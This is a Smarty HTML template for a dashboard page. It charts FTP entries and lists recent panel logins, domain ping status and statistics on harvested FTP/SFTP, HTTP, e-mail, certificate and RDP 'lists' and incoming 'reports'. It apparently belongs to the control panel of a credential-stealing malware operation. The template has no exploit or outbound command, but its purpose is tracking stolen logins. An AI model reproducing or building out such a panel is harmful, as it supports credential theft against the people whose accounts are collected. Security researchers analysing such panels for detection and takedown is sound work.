<div class="mychart" id="ftp_last_24_hours">
<img width="680" height="230" src="{$smarty.server.SCRIPT_NAME}?action=chart&amp;routine=last_24_hours" alt="" />
</div>

{if ($show_logons_to_users || $priv_is_admin) && !$disable_ip_logger}
	{if count($login_list)}
			<h4>Last login</h4>
			
			<table id="table_logins" width="700px" cellspacing="0" summary="Latest user logins">
			<tr>
			<th width="14%">User</th>
			<th width="19%">IP</th>
			<th width="42%">Country</th>
			<th width="25%">Entry time</th>
			</tr>

			{foreach from=$login_list item=login_item}
			<tr>
			<td>{$login_item.user}</td>
			<td>{$login_item.ip}</td>
			<td>{country base_path="includes/design/images/flags/" country_code=$login_item.country_code country_name=$login_item.country_name}</td>
			<td>{$login_item.import_time}</td>
			</tr>
			{/foreach}

			</table><br />
	{/if}
{/if}

{if count($domain_list)}
			<h4>Domains</h4><table id="table_domains" width="700px" cellspacing="0" summary="Domains ping status">
			<tr>
			<th width="75%">Domain</th>
			<th width="25%">Status</th>
			</tr>

			{foreach from=$domain_list item=domain_item}
			<tr>
			<td><a target="_blank" href="{$domain_item.url}">{$domain_item.url}</a></td>
			<td><p id="chk_status_{$domain_item.domain_id}"><span class="wait"></span></p></td>
			</tr>
			{/foreach}

			</table><br />
{/if}

			<table id="table_stats" width="700px" cellspacing="0" summary="Statistics">
			<tr>
			<th colspan="2">Statistics</th>
			</tr>
			
			<tr><td width="75%">Server time</td><td width="25%">{$server_time}</td></tr>
			<tr><td>Total FTP/SFTP list</td><td>{$total_ftp_items_count+$total_ssh_items_count}</td></tr>
			{if $enable_http_mode && ($show_http_to_users || $priv_is_admin)}
			<tr><td>Total HTTP/HTTPS list</td><td>{$total_http_items_count}</td></tr>
			{/if}
			{if $enable_email_mode && ($show_email_to_users || $priv_is_admin)}
			<tr><td>Total E-mail list</td><td>{$total_email_items_count}</td></tr>
			{/if}
			{if $show_other_to_users || $priv_is_admin}
			<tr><td>Total certificates list</td><td>{$total_cert_items_count}</td></tr>
			{/if}
			<tr><td>Total RDP list</td><td>{$total_rdp_items_count}</td></tr>
			<tr><td>Unique reports</td><td>{$total_reports_count}</td></tr>
			<tr><td>Obtain a duplicate</td><td>{$report_duplicates}</td></tr>
			<tr><td>Not handled reports</td><td>{$total_nonparsed_reports}</td></tr>
			<tr><td>Events in the system log files</td><td>{$log_events_count}</td></tr>
			<tr><td>Total records in the database</td><td>{$total_reports_size|file_size}</td></tr>
			<tr><td>The full size of the database</td><td>{$db_size|file_size}</td></tr>
			{if $enable_http_mode && ($show_http_to_users || $priv_is_admin)}
			<tr><td>FTP(HTTP) added over the past 24 hours</td><td>{$new_ftp_last_24_hours} ({$new_http_last_24_hours})</td></tr>
			<tr><td>FTP(HTTP) added over the last hour</td><td>{$new_ftp_last_hour} ({$new_http_last_hour})</td></tr>
			<tr><td>FTP(HTTP) added over the past 10 minutes</td><td>{$new_ftp_last_10_minutes} ({$new_http_last_10_minutes})</td></tr>
			{else}
			<tr><td>FTP added in the last 24 hours</td><td>{$new_ftp_last_24_hours}</td></tr>
			<tr><td>FTP added for the last hour</td><td>{$new_ftp_last_hour}</td></tr>
			<tr><td>FTP added in last 10 minutes</td><td>{$new_ftp_last_10_minutes}</td></tr>
			{/if}
			<tr><td>New reports in the last 24 hours</td><td>{$new_reports_last_24_hours}</td></tr>
			<tr><td>New reports in the last hour</td><td>{$new_reports_last_hour}</td></tr>
			<tr><td>New reports in the last 10 minutes</td><td>{$new_reports_last_10_minutes}</td></tr>
			</table>
